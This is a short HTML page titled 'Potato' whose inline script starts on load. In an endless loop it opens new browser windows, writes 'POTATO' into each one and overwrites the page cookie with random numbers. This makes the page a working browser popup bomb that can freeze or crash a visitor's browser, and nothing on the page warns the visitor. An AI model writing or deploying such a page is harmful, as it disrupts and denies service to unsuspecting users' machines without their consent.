<!DOCTYPE html>
<html>
  <head>
		<body>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Potato</title>
		<script>
			function getRndInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1) ) + min;
}

			while(2 == 2){
			var x = window.open();
			x.document.write("POTATO");
			document.cookie = getRndInteger(1, 100000);
			};
			</script>
  </head>
  </body>
</html>
